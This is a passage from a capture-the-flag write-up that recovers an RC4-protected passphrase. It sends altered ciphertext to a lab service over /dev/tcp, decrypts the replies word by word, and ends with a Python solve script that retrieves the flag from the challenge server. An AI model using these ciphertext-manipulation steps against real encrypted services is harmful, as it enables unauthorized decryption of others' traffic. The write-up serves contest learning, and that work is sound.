root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 decrypt.py 41da4ce1741d4ba884d499f94af4c4951f
Encrypted bytes: 6ed101ee76155ffc90da9fb05cf5bbd51f
Decrypted bytes: b'administration\na\n'
```

So we know that:
```
6ed101ee76155ffc90da9fb05cf5bb -> administration
d51f -> a
```

We can corrupt another word and try again:
```console
csa@9fdd7bdc3e3f:~$ exec 3<> /dev/tcp/172.16.238.2/1337
csa@9fdd7bdc3e3f:~$ echo -en "\xb7\x5a\xa7\x53\x7b\x30\x6a\x86\x39\x17\x33\xe2\xe6"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x6f\xd1\x01\xee\x76\x15\x5f\xfc\x90\xda\x9f\xb0\x5c\xf5\xbb"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xd5\x1f"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x49\x4c\x13"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xba\xc2"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x34\x1b\x5e\xbe\x22\xcd\x43\x2c\x4a\x79\x94\xd4\xbc\x4a"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x3e\x32\x17\xf7\xe1\x10"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x75\xef\xbf\x54\x55\x7c\xed"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x4b\xbd\x1e\xeb\xc0\x33\xfc\x30"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xbf\xfd\xd8\xb8\x1f\x0c\x9c\x96\xf0\x55"  1>&3
csa@9fdd7bdc3e3f:~$ read 0<&3
```

Session:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked/captures# tshark -r attack.pcapng -qz follow,tcp,raw,4
Running as user "root" and group "root". This could be dangerous.

===================================================================
Follow: tcp,raw
Filter: tcp.stream eq 4
Node 0: 172.16.238.3:45346
Node 1: 172.16.238.2:1337
        596e2b00b349e78de0cc586e4582c8d70e6027f76af0220da7a31e3376447cbb
b75aa7537b306a86391733e2e6
6fd101ee76155ffc90da9fb05cf5bb
d51f494c13bac2341b5ebe22cd432c4a7994d4bc4a3e3217f7e11075efbf54557ced4bbd1eebc033fc30bffdd8b81f0c9c96f055
        fa7a08597592af711347a570db42340e1d
===================================================================
```

Decryption:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 decrypt.py fa7a08597592af711347a570db42340e1d
Encrypted bytes: d51f494c13bac2341b5ebe22cd432c4a79
Decrypted bytes: b'a\nas\nI\nenvironmen'
Encrypted bytes: f055
Decrypted bytes: b'D@'
```

So from here we can see that:
```
d51f -> a
494c13 -> as
bac2 -> I
341b5ebe22cd432c4a7994d4bc4a79 -> environment or environmental
```

We continue with this method, e.g.
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 decrypt.py 90f19bb1010992d8f130db7153a8a2759f
Encrypted bytes: bffdd8b81f0c9c96f055
Decrypted bytes: b'according\n
```

And we are able to decrypt most of the words:
```console
b75aa7537b306a86391733e2e6 -> ?
6ed101ee76155ffc90da9fb05cf5bb -> administration
d51f -> a
494c13 -> as
bac2 -> I
341b5ebe22cd432c4a7994d4bc4a -> environmental
3e3217f7e110 -> about
75efbf54557ced -> across
4bbd1eebc033fc30 -> ability
bffdd8b81f0c9c96f055 -> according
```

We can't control the output well enough to guess the first word, but we know according to it's length that it is either `organization` or `particularly`. We can just try both.

Note that we can decode half of the flag this way as well, but again we can't control the output well enough to decode the full flag. We'll just have to send the passphrase like intended:

```python
from Crypto.Cipher import ARC4
import socket

TCP_IP = '3.126.154.76'
TCP_PORT = 80
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print ("received data: {}".format(data.decode("ascii")))
cipher = ARC4.new("csa-mitm-key")

data = s.recv(BUFFER_SIZE)
print ("received data (Length: {}): {}".format(len(data), data.hex()))
print(cipher.decrypt(data))

list = ["particularly", "administration", "a", "as", "I", "environmental", "about", "across", "ability", "according"]

for word in list:
    s.send(cipher.encrypt(word + "\n"))

data = s.recv(BUFFER_SIZE)
print ("received data: {}".format(data.hex()))
print(cipher.decrypt(data))

s.close()
```

Output:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 solve.py
received data: Welcome! your RC4 key is: csa-mitm-key

received data (Length: 32): 013aa13224c14f2c4182ee087d801f1054c992a55f1bec40f3db3b9532ea38f9
b"Hi! what's the secret sequence?\n"
received data: 7b5652b5a0dd441a564ef8df3a5faf0615d90f29de4424b2c9df81b3513caf794c5c5c6e124c1081ed9bc1ab
b'CSA{i_gu355_I_need_tO_ChN4GE_mY_encrYp71On}\n'
```